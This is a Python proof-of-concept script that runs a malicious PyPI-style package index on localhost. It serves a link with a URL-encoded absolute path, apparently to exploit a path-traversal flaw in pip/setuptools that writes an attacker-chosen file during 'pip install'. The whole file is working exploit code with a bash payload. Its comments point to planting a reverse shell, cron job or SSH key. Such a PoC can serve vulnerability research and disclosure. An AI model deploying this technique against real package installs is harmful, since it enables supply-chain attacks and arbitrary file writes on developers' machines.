#!/usr/bin/env python3
"""
Malicious Package Index Server

Run this server, then in another terminal:
    pip install --index-url http://127.0.0.1:8888/simple/ malicious-package

This will write a file to /tmp/EXPLOITED_VIA_PIP.txt
"""

import http.server
import socketserver
from urllib.parse import quote, unquote

TARGET_FILE = "/tmp/EXPLOITED_VIA_PIP.txt"
PACKAGE_NAME = "malicious-package"

# Create a minimal valid tar.gz with our payload
# This is a real gzipped tarball containing a setup.py
import base64
MALICIOUS_TARBALL = base64.b64decode(
    # Minimal tarball with setup.py that prints a message
    b'H4sIAAAAAAAAA+3OMQrCQBCF4Z5T/IewsBshCYqFnsDKwt7CTGZDV5JddmZRb2'
    b'+CByjYWT3e9zHwhuFfkzWOFPM8xiMWz1MTD+wTq7zYZO3a7KKLLMuioihsXj6+'
    b'vN/udtsOQG0b27bNYT1e0HdnKwUAAAAAAAAAAAAAAAAAAADgf30AoMYuKQAoAAA='
)

# Our payload that will be written to the target file
PAYLOAD = b"""#!/bin/bash
# THIS FILE WAS WRITTEN VIA PATH TRAVERSAL IN PIP/SETUPTOOLS
# Attacker could put a reverse shell, cron job, or SSH key here
echo "EXPLOITED via pip install at $(date)" >> /tmp/exploit.log
"""


class MaliciousIndexHandler(http.server.BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        print(f"[REQUEST] {self.command} {self.path}")

    def do_GET(self):
        path = self.path.split('?')[0].split('#')[0]  # Remove query/fragment

        if path in ('/', '/simple/', '/simple'):
            # Root index - list packages
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(f"""<!DOCTYPE html>
<html><head><title>Simple Index</title></head>
<body>
<a href="/simple/{PACKAGE_NAME}/">{PACKAGE_NAME}</a>
</body></html>
""".encode())

        elif f'/simple/{PACKAGE_NAME}' in path:
            # Package page - serve link with malicious filename
            # The trick: URL must END with a valid-looking package name
            # but the PATH contains the traversal
            # Format: /packages/%2Ftmp%2FEXPLOIT.tar.gz -> decodes to /tmp/EXPLOIT.tar.gz

            # Make target look like a tarball so setuptools accepts it
            target_as_tarball = TARGET_FILE  # /tmp/EXPLOITED_VIA_PIP.txt
            encoded_target = quote(target_as_tarball, safe='')

            # The link text shows valid package name, but href has encoded absolute path
            # We append #egg=malicious-package to help setuptools recognize it
            malicious_href = f"/{encoded_target}#egg={PACKAGE_NAME}"

            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()

            html = f"""<!DOCTYPE html>
<html><head><title>Links for {PACKAGE_NAME}</title></head>
<body>
<h1>Links for {PACKAGE_NAME}</h1>
<a href="{malicious_href}">{PACKAGE_NAME}-1.0.tar.gz</a><br/>
</body></html>
"""
            self.wfile.write(html.encode())
            print(f"[ATTACK] Served malicious link: {malicious_href}")
            print(f"[ATTACK] Encoded path decodes to: {target_as_tarball}")

        else:
            # Any other request - serve the payload
            decoded_path = unquote(path)
            print(f"[PAYLOAD] Serving payload for path: {decoded_path}")

            self.send_response(200)
            self.send_header('Content-Type', 'application/gzip')
            self.send_header('Content-Length', len(PAYLOAD))
            self.end_headers()
            self.wfile.write(PAYLOAD)
            print(f"[PAYLOAD] Wrote {len(PAYLOAD)} bytes")


def main():
    PORT = 8888

    print("=" * 60)
    print("MALICIOUS PACKAGE INDEX SERVER")
    print("=" * 60)
    print(f"\nTarget file: {TARGET_FILE}")
    print(f"\nServer starting on http://127.0.0.1:{PORT}/simple/")
    print("\nTo test the exploit, run in another terminal:")
    print(f"    pip install --index-url http://127.0.0.1:{PORT}/simple/ {PACKAGE_NAME}")
    print("\nOr with pip's trusted-host flag if needed:")
    print(f"    pip install --index-url http://127.0.0.1:{PORT}/simple/ --trusted-host 127.0.0.1 {PACKAGE_NAME}")
    print("\n" + "=" * 60)
    print("Waiting for connections...\n")

    # Clean up old file
    import os
    if os.path.exists(TARGET_FILE):
        os.remove(TARGET_FILE)
        print(f"[SETUP] Removed old {TARGET_FILE}")

    with socketserver.TCPServer(("127.0.0.1", PORT), MaliciousIndexHandler) as httpd:
        httpd.allow_reuse_address = True
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[SHUTDOWN] Server stopped")


if __name__ == "__main__":
    main()
